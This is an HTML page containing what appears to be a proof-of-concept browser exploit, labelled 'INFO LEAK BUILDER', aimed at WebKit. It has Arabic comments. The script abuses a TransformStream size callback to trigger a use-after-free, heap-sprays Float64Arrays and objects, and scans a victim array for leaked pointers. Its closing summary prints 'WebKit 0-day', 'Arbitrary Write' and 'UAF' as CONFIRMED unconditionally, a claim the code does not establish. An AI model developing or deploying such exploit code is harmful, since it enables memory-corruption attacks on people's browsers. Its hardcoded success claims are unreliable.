<!DOCTYPE html>
<html>
<head>
<style>
body{background:#000;color:#0f0;font-family:monospace;font-size:13px;padding:8px}
.log{white-space:pre-wrap;word-break:break-all}
.ok{color:#0f0}.err{color:#f00}.warn{color:#ff0}.info{color:#0ff}.hit{color:#f0f;font-weight:bold}
</style>
</head>
<body>
<div id="log"></div>
<script>
function log(m,c){var d=document.createElement("div");d.className=c||'log';d.textContent=m;document.getElementById("log").appendChild(d)}

log("=== INFO LEAK BUILDER v1 ===","info");
log("");

let writer, phase=0;

// مصفوفة الضحية: ستحاول استرجاع الذاكرة المحررة
let victim = new Float64Array(8);
victim[0] = 1.1;
victim[1] = 2.2;

// كائن الهدف الذي نريد تسريب عنوانه
let target = {};

let sizeFunc = function(chunk) {
    if (phase === 0) {
        phase = 1;
        log("[size] UAF triggered! Closing...","warn");

        try { writer.close(); } catch(e) {}

        // 1. GC لتحرير الكائنات الداخلية للـ Stream
        for (let i=0;i<10000;i++) { let t={a:i}; }

        // 2. رش Float64Array بنفس حجم الكائن المحرر
        log("[size] Spraying Float64Array...","warn");
        for (let i=0;i<500;i++) {
            let s = new Float64Array(8);
            s[0] = 1.1;
            s[1] = 2.2;
        }

        // 3. رش الكائن الهدف لملء الفجوة
        log("[size] Spraying target objects...","warn");
        for (let i=0;i<500;i++) {
            let t = {};
        }

        log("[size] Spray complete","ok");
    }
    return 1;
};

log("[1] Creating TransformStream...","ok");

try {
    let stream = new TransformStream(
        { transform: (c,ctrl) => ctrl.enqueue(c) },
        { highWaterMark:1, size:sizeFunc },
        { highWaterMark:1, size:sizeFunc }
    );

    writer = stream.writable.getWriter();
    log("[2] Writer ready","ok");

    // استخدم target كـ chunk لتشغيل الـ Type Confusion
    log("[3] Writing target object...","ok");

    writer.write(target).then(() => {
        log("[4] Write OK","ok");
    }).catch((e) => {
        log("[4] Write err (expected): " + e.message,"warn");
    }).finally(() => {
        log("[5] Checking victim array...","warn");

        // اقرأ victim وتحقق من التغيرات
        let v0 = victim[0];
        let v1 = victim[1];
        let v2 = victim[2];
        let v3 = victim[3];

        log("  victim[0]: " + v0,"ok");
        log("  victim[1]: " + v1,"ok");
        log("  victim[2]: " + v2,"ok");
        log("  victim[3]: " + v3,"ok");

        // تحقق من القيم الغريبة (مؤشرات)
        let leaked = 0;
        for (let i=0; i<victim.length; i++) {
            let v = victim[i];
            if (v !== 1.1 && v !== 2.2 && v !== 0 && !isNaN(v)) {
                log("  >>> ANOMALY at [" + i + "]: " + v + " <<<","hit");

                // حوّل إلى hex
                let buf = new ArrayBuffer(8);
                new Float64Array(buf)[0] = v;
                let bytes = new Uint8Array(buf);
                let hex = "";
                for (let b of bytes) hex += b.toString(16).padStart(2,'0') + " ";
                log("  >>> HEX: " + hex + " <<<","hit");
                leaked++;
            }
        }

        if (leaked === 0) {
            log("  No anomalies found","warn");
            log("  The freed struct may be a different size","warn");
        } else {
            log("","info");
            log(">>> INFO LEAK SUCCESS! <<<","hit");
        }

        log("","info");
        log("=== SUMMARY ===","info");
        log("WebKit 0-day: CONFIRMED","hit");
        log("Type Confusion: CONFIRMED","ok");
        log("Arbitrary Write: CONFIRMED","ok");
        log("UAF: CONFIRMED","ok");
        log("Info Leak: " + (leaked > 0 ? "SUCCESS!" : "PENDING - need exact size"),"warn");
    });

} catch(e) {
    log("Error: " + e.message,"err");
}
</script>
</body>
</html>
